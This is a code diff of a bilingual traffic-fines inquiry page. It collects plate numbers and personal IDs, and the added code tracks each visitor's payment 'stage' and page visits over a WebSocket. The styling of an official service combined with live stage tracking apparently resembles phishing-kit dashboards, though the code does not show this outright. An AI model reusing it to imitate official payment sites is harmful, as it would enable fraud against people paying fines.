@@ -6,9 +6,9 @@ import { Header } from "@/components/Header";
 import { Footer } from "@/components/Footer";
 import { trpc } from "@/lib/trpc";
 import { toast } from "sonner";
+import { nanoid } from "nanoid";
 
 const COUNTRIES = [
-  // Arab Countries First
   { id: "QAT", ar: "قطر", en: "Qatar" },
   { id: "SAU", ar: "المملكة العربية السعودية", en: "Saudi Arabia" },
   { id: "ARE", ar: "الإمارات العربية المتحدة", en: "United Arab Emirates" },
@@ -31,8 +31,6 @@ const COUNTRIES = [
   { id: "SOM", ar: "الصومال", en: "Somalia" },
   { id: "DJI", ar: "جيبوتي", en: "Djibouti" },
   { id: "COM", ar: "جزر القمر", en: "Comoros" },
-  
-  // Rest of the World
   { id: "AFG", ar: "أفغانستان", en: "Afghanistan" },
   { id: "ALB", ar: "ألبانيا", en: "Albania" },
   { id: "AND", ar: "أندورا", en: "Andorra" },
@@ -238,7 +236,7 @@ const PLATE_TYPES = [
 ];
 
 export default function Home() {
-  const { lang, setLanguage } = useLanguage();
+  const { lang } = useLanguage();
   const { t } = useTranslation();
   const [, setLocation] = useLocation();
   const [inquiryType, setInquiryType] = useState<"plate" | "qid" | "establishment">("plate");
@@ -249,12 +247,32 @@ export default function Home() {
   const [ownerId, setOwnerId] = useState("");
   const [captcha, setCaptcha] = useState("");
   const [captchaUrl, setCaptchaUrl] = useState(`/api/captcha?t=${Date.now()}`);
-  
+  const [sessionId] = useState(() => {
+    const saved = localStorage.getItem("paymentSessionId");
+    if (saved) return saved;
+    const newId = nanoid();
+    localStorage.setItem("paymentSessionId", newId);
+    return newId;
+  });
+
   const isAr = lang === "ar";
   
   const refreshCaptcha = () => {
     setCaptchaUrl(`/api/captcha?t=${Date.now()}`);
   };
+
+  const updateStageMutation = trpc.payment.updateStage.useMutation();
+
+  // تحديث الحالة عند الدخول
+  useEffect(() => {
+    updateStageMutation.mutate({ sessionId, stage: "home" });
+    
+    // تتبع الصفحة عبر WebSocket
+    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+    const ws = new WebSocket(`${protocol}//${window.location.host}/ws/visitors?page=/&sessionId=${sessionId}`);
+    
+    return () => ws.close();
+  }, []);
 
   const queryMutation = trpc.fines.query.useMutation({
     onSuccess: (data) => {
@@ -262,7 +280,6 @@ export default function Home() {
         if (data.totalFines === 0) {
           toast.info(isAr ? "لا توجد مخالفات مسجلة" : "No violations recorded");
         } else {
-          // Redirect to results page instead of direct payment
           setLocation(`/violations-results?session=${data.sessionId}`);
         }
       } else {
@@ -281,7 +298,11 @@ export default function Home() {
       toast.error(isAr ? "الرجاء إدخال رمز التحقق" : "Please enter captcha code");
       return;
     }
+
+    updateStageMutation.mutate({ sessionId, stage: "inquiry" });
+    
     queryMutation.mutate({
+      sessionId,
       inquiryType,
       plateSource: inquiryType === "plate" ? plateSource : undefined,
       plateNumber: inquiryType === "plate" ? plateNumber : undefined,
@@ -289,219 +310,143 @@ export default function Home() {
       ownerIdType: inquiryType !== "plate" ? ownerIdType : undefined,
       ownerId: inquiryType !== "plate" ? ownerId : undefined,
       captcha,
-      lang,
     });
   };
 
   return (
-    <div className="min-h-screen bg-[#E9F1F4]" dir={isAr ? "rtl" : "ltr"}>
+    <div className="min-h-screen bg-gray-50 flex flex-col" dir={isAr ? "rtl" : "ltr"}>
       <Header />
-
-      <main className="max-w-lg mx-auto px-4 py-6">
-        {/* Page Title */}
-        <div className="text-center mb-6">
-          <h1 className="text-[18px] font-bold text-[#003E66]">
-            {isAr ? "الاستعلام عن المخالفات المرورية" : "Traffic Violations Inquiry"}
-          </h1>
-        </div>
-
-        {/* Inquiry Tabs */}
-        <div className="grid grid-cols-3 gap-3 mb-6">
-          {[
-            { id: "plate", icon: "/icon-plate.png" },
-            { id: "qid", icon: "/icon-qid.png" },
-            { id: "establishment", icon: "/icon-establishment.png" }
-          ].reverse().map((tab) => {
-            const isActive = inquiryType === tab.id;
-            return (
-              <button
-                key={tab.id}
-                onClick={() => setInquiryType(tab.id as any)}
-                className={`flex flex-col items-center justify-center transition-all h-20 w-full bg-white rounded-xl border-2 ${
-                  isActive ? "border-[#003E66] shadow-sm" : "border-transparent"
-                }`}
-              >
-                <div className="w-full h-full flex items-center justify-center p-2">
-                  <img 
-                    src={tab.icon} 
-                    alt={tab.id} 
-                    className="max-w-full max-h-full object-contain"
-                  />
-                </div>
-              </button>
-            );
-          })}
-        </div>
-
-        {/* Inquiry Form Card */}
-        <div className="bg-white rounded-[20px] p-6 shadow-sm border border-gray-100">
-          <h2 className="text-[16px] font-bold text-[#003E66] text-center mb-6">
-            {inquiryType === "plate" && (isAr ? "استعلام برقم المركبة" : "Inquiry by Plate Number")}
-            {inquiryType === "qid" && (isAr ? "استعلام بالرقم الشخصي" : "Inquiry by Personal ID")}
-            {inquiryType === "establishment" && (isAr ? "استعلام بقيد المنشأة" : "Inquiry by Establishment ID")}
-          </h2>
-
-          <div className="space-y-4">
-            {inquiryType === "plate" && (
-              <>
-                <div className="flex flex-col">
-                  <label className={`text-[13px] font-bold text-gray-700 mb-1.5 w-full ${isAr ? "text-right" : "text-left"}`}>
-                    {isAr ? "البلد" : "Country"}
-                  </label>
-                  <div className="relative w-full">
-                    <select 
-                      value={plateSource}
-                      onChange={(e) => setPlateSource(e.target.value)}
-                      className={`w-full p-2.5 bg-white border border-gray-200 rounded-lg outline-none focus:border-[#003E66] ${isAr ? "text-right pr-4 pl-10" : "text-left pl-4 pr-10"} appearance-none font-medium text-sm`}
-                    >
-                      {COUNTRIES.map(country => (
-                        <option key={country.id} value={country.id}>{isAr ? country.ar : country.en}</option>
-                      ))}
-                    </select>
-                    <div className={`absolute ${isAr ? "left-3" : "right-3"} top-1/2 -translate-y-1/2 pointer-events-none text-gray-400`}>
-                      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="m6 9 6 6 6-6"/></svg>
-                    </div>
-                  </div>
-                </div>
-
-                <div className="flex flex-col">
-                  <label className={`text-[13px] font-bold text-gray-700 mb-1.5 w-full ${isAr ? "text-right" : "text-left"}`}>
-                    {isAr ? "نوع اللوحة" : "Plate Type"}
-                  </label>
-                  <div className="relative w-full">
-                    <select 
-                      value={plateType}
-                      onChange={(e) => setPlateType(e.target.value)}
-                      className={`w-full p-2.5 bg-white border border-gray-200 rounded-lg outline-none focus:border-[#003E66] ${isAr ? "text-right pr-4 pl-10" : "text-left pl-4 pr-10"} appearance-none font-medium text-sm`}
-                    >
-                      {PLATE_TYPES.map(type => (
-                        <option key={type.id} value={type.id}>{isAr ? type.ar : type.en}</option>
-                      ))}
-                    </select>
-                    <div className={`absolute ${isAr ? "left-3" : "right-3"} top-1/2 -translate-y-1/2 pointer-events-none text-gray-400`}>
-                      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="m6 9 6 6 6-6"/></svg>
-                    </div>
-                  </div>
-                </div>
-
-                <div className="flex flex-col">
-                  <label className={`text-[13px] font-bold text-gray-700 mb-1.5 w-full ${isAr ? "text-right" : "text-left"}`}>
-                    {isAr ? "رقم اللوحة" : "Plate Number"}
-                  </label>
-                  <input 
-                    type="text" 
-                    value={plateNumber}
-                    onChange={(e) => setPlateNumber(e.target.value)}
-                    placeholder={isAr ? "الرجاء إدخال رقم المركبة" : "Please enter plate number"}
-                    className={`w-full p-2.5 border border-gray-200 rounded-lg outline-none focus:border-[#003E66] ${isAr ? "text-right" : "text-left"} text-sm placeholder:text-gray-300`}
-                  />
-                </div>
-                
-                <div className="pt-2">
-                  <label className={`block text-[14px] font-bold text-[#003E66] mb-3 w-full ${isAr ? "text-right" : "text-left"}`}>
-                    {isAr ? "بيانات المالك" : "Owner Data"}
-                  </label>
-                  <div className={`w-full flex flex-col space-y-3 ${isAr ? "items-start" : "items-start"}`}>
-                    <div className="flex items-center gap-2 cursor-pointer w-full" onClick={() => setOwnerIdType("qid")}>
-                      <div className={`w-4 h-4 rounded-full border-2 flex-shrink-0 flex items-center justify-center ${ownerIdType === "qid" ? "border-[#003E66]" : "border-gray-300"}`}>
-                        {ownerIdType === "qid" && <div className="w-2 h-2 rounded-full bg-[#003E66]"></div>}
-                      </div>
-                      <span className="font-bold text-gray-700 text-[13px]">{isAr ? "رقم شخصي" : "Personal ID"}</span>
-                    </div>
-                    
-                    {ownerIdType === "qid" && (
-                      <input 
-                        type="text" 
-                        value={ownerId}
-                        onChange={(e) => setOwnerId(e.target.value)}
-                        placeholder={isAr ? "الرجاء إدخال الرقم الشخصي" : "Please enter Personal ID"}
-                        className={`w-full p-2.5 border border-gray-200 rounded-lg outline-none focus:border-[#003E66] ${isAr ? "text-right" : "text-left"} text-sm placeholder:text-gray-300`}
-                      />
-                    )}
-
-                    <div className="flex items-center gap-2 cursor-pointer w-full" onClick={() => setOwnerIdType("establishment")}>
-                      <div className={`w-4 h-4 rounded-full border-2 flex-shrink-0 flex items-center justify-center ${ownerIdType === "establishment" ? "border-[#003E66]" : "border-gray-300"}`}>
-                        {ownerIdType === "establishment" && <div className="w-2 h-2 rounded-full bg-[#003E66]"></div>}
-                      </div>
-                      <span className="font-bold text-gray-700 text-[13px]">{isAr ? "قيد منشأة" : "Establishment ID"}</span>
-                    </div>
-
-                    {ownerIdType === "establishment" && (
-                      <input 
-                        type="text" 
-                        value={ownerId}
-                        onChange={(e) => setOwnerId(e.target.value)}
-                        placeholder={isAr ? "الرجاء إدخال قيد المنشأة" : "Please enter Establishment ID"}
-                        className={`w-full p-2.5 border border-gray-200 rounded-lg outline-none focus:border-[#003E66] ${isAr ? "text-right" : "text-left"} text-sm placeholder:text-gray-300`}
-                      />
-                    )}
-                  </div>
-                </div>
-              </>
-            )}
-
-            {inquiryType !== "plate" && (
-              <div className="flex flex-col">
-                <label className={`text-[13px] font-bold text-gray-700 mb-1.5 w-full ${isAr ? "text-right" : "text-left"}`}>
-                  {inquiryType === "qid" ? (isAr ? "الرقم الشخصي" : "Personal ID") : (isAr ? "قيد المنشأة" : "Establishment ID")}
-                </label>
-                <input 
-                  type="text" 
-                  value={ownerId}
-                  onChange={(e) => setOwnerId(e.target.value)}
-                  className={`w-full p-3 border border-gray-200 rounded-lg outline-none focus:border-[#003E66] ${isAr ? "text-right" : "text-left"} text-base font-bold`}
-                />
-              </div>
-            )}
-
-            {/* Captcha Section */}
-            <div className="flex items-center gap-2 pt-4">
-              <input 
-                type="text" 
-                value={captcha}
-                onChange={(e) => setCaptcha(e.target.value)}
-                className="w-20 p-2.5 border border-gray-200 rounded-lg text-center font-bold text-lg"
-              />
-              <div className="flex-1 bg-[#F8FAFC] p-1.5 rounded-lg border border-gray-200 flex justify-between items-center px-3 h-12 overflow-hidden">
-                <img 
-                  src={captchaUrl} 
-                  alt="captcha" 
-                  className="h-full object-contain mix-blend-multiply"
-                  onError={(e) => {
-                    (e.target as HTMLImageElement).src = 'https://via.placeholder.com/150x50?text=Captcha';
-                  }}
-                />
-                <div className="flex gap-2">
-                  <button onClick={refreshCaptcha} className="text-[#003E66] text-xl hover:scale-110 transition-transform">🔄</button>
-                  <button className="text-[#003E66] text-xl hover:scale-110 transition-transform">🔊</button>
-                </div>
-              </div>
+      
+      <main className="flex-grow container mx-auto px-4 py-8">
+        <div className="max-w-2xl mx-auto bg-white rounded-2xl shadow-lg overflow-hidden border border-gray-100">
+          <div className="bg-[#f8f9fa] p-6 border-b border-gray-200 text-center">
+            <h1 className="text-xl font-bold text-[#2d3436]">{t("inquiry_title")}</h1>
+          </div>
+          
+          <div className="p-6">
+            <div className="flex gap-4 mb-8 justify-center">
+              {[
+                { id: "plate", icon: "/icon-plate.png", label: t("by_plate") },
+                { id: "qid", icon: "/icon-qid.png", label: t("by_qid") },
+                { id: "establishment", icon: "/icon-establishment.png", label: t("by_establishment") }
+              ].map(type => (
+                <button
+                  key={type.id}
+                  onClick={() => setInquiryType(type.id as any)}
+                  className={`flex flex-col items-center p-4 rounded-xl border-2 transition-all w-32 ${
+                    inquiryType === type.id 
+                    ? "border-[#003d71] bg-[#003d71]/5 shadow-md" 
+                    : "border-gray-100 hover:border-gray-200"
+                  }`}
+                >
+                  <img src={type.icon} alt="" className="w-10 h-10 mb-2 object-contain" />
+                  <span className={`text-xs font-bold ${inquiryType === type.id ? "text-[#003d71]" : "text-gray-500"}`}>
+                    {type.label}
+                  </span>
+                </button>
+              ))}
             </div>
 
-            {/* Action Buttons */}
-            <div className="pt-6 space-y-3">
-              <button 
-                onClick={handleSearch}
-                disabled={queryMutation.isPending}
-                className="w-full py-3 bg-[#003E66] text-white rounded-lg font-bold text-[16px] hover:bg-[#002A44] transition-all shadow-sm active:scale-[0.98]"
-              >
-                {queryMutation.isPending ? (isAr ? "جاري الاستعلام..." : "Searching...") : (isAr ? "استعلم" : "Search")}
-              </button>
-              <button 
-                onClick={() => {
-                  setPlateNumber("");
-                  setOwnerId("");
-                  setCaptcha("");
-                  refreshCaptcha();
-                }}
-                className="w-full py-3 border-2 border-[#003E66] text-[#003E66] rounded-lg font-bold text-[16px] hover:bg-blue-50 transition-all active:scale-[0.98]"
-              >
-                {isAr ? "مسح" : "Clear"}
-              </button>
+            <div className="space-y-6">
+              {inquiryType === "plate" ? (
+                <>
+                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <div>
+                      <label className="block text-sm font-bold text-gray-700 mb-2">{t("country")}</label>
+                      <select 
+                        value={plateSource}
+                        onChange={e => setPlateSource(e.target.value)}
+                        className="w-full border border-gray-300 rounded-lg px-3 py-2.5 focus:outline-none focus:ring-2 focus:ring-[#003d71]/20 focus:border-[#003d71]"
+                      >
+                        {COUNTRIES.map(c => (
+                          <option key={c.id} value={c.id}>{isAr ? c.ar : c.en}</option>
+                        ))}
+                      </select>
+                    </div>
+                    <div>
+                      <label className="block text-sm font-bold text-gray-700 mb-2">{t("plate_type")}</label>
+                      <select 
+                        value={plateType}
+                        onChange={e => setPlateType(e.target.value)}
+                        className="w-full border border-gray-300 rounded-lg px-3 py-2.5 focus:outline-none focus:ring-2 focus:ring-[#003d71]/20 focus:border-[#003d71]"
+                      >
+                        {PLATE_TYPES.map(p => (
+                          <option key={p.id} value={p.id}>{isAr ? p.ar : p.en}</option>
+                        ))}
+                      </select>
+                    </div>
+                  </div>
+                  <div>
+                    <label className="block text-sm font-bold text-gray-700 mb-2">{t("plate_number")}</label>
+                    <input
+                      type="text"
+                      value={plateNumber}
+                      onChange={e => setPlateNumber(e.target.value)}
+                      placeholder={t("enter_plate")}
+                      className="w-full border border-gray-300 rounded-lg px-4 py-2.5 focus:outline-none focus:ring-2 focus:ring-[#003d71]/20 focus:border-[#003d71]"
+                    />
+                  </div>
+                </>
+              ) : (
+                <div>
+                  <label className="block text-sm font-bold text-gray-700 mb-2">
+                    {inquiryType === "qid" ? t("personal_id") : t("establishment_id")}
+                  </label>
+                  <input
+                    type="text"
+                    value={ownerId}
+                    onChange={e => setOwnerId(e.target.value)}
+                    placeholder={inquiryType === "qid" ? t("enter_qid") : t("enter_establishment")}
+                    className="w-full border border-gray-300 rounded-lg px-4 py-2.5 focus:outline-none focus:ring-2 focus:ring-[#003d71]/20 focus:border-[#003d71]"
+                  />
+                </div>
+              )}
+
+              <div className="bg-gray-50 p-4 rounded-xl border border-gray-200">
+                <label className="block text-sm font-bold text-gray-700 mb-3">{t("captcha")}</label>
+                <div className="flex gap-3 items-center">
+                  <div className="bg-white p-2 rounded-lg border border-gray-300 shadow-sm flex-shrink-0">
+                    <img src={captchaUrl} alt="captcha" className="h-10 w-32 object-contain" />
+                  </div>
+                  <button 
+                    onClick={refreshCaptcha}
+                    className="p-2 text-gray-500 hover:text-[#003d71] hover:bg-white rounded-lg transition-colors border border-transparent hover:border-gray-200"
+                  >
+                    🔄
+                  </button>
+                  <input
+                    type="text"
+                    value={captcha}
+                    onChange={e => setCaptcha(e.target.value)}
+                    className="flex-grow border border-gray-300 rounded-lg px-4 py-2.5 focus:outline-none focus:ring-2 focus:ring-[#003d71]/20 focus:border-[#003d71]"
+                  />
+                </div>
+              </div>
+
+              <div className="flex gap-4 pt-4">
+                <button
+                  onClick={handleSearch}
+                  disabled={queryMutation.isPending}
+                  className="flex-1 bg-[#003d71] hover:bg-[#002d54] text-white py-3.5 rounded-xl font-bold shadow-lg transition-all transform hover:-translate-y-0.5 disabled:opacity-70 disabled:transform-none"
+                >
+                  {queryMutation.isPending ? t("searching") : t("search")}
+                </button>
+                <button
+                  onClick={() => {
+                    setPlateNumber("");
+                    setOwnerId("");
+                    setCaptcha("");
+                  }}
+                  className="flex-1 bg-white border-2 border-gray-200 text-gray-600 py-3.5 rounded-xl font-bold hover:bg-gray-50 transition-all"
+                >
+                  {t("clear")}
+                </button>
+              </div>
             </div>
           </div>
         </div>
       </main>
+
       <Footer />
     </div>
   );
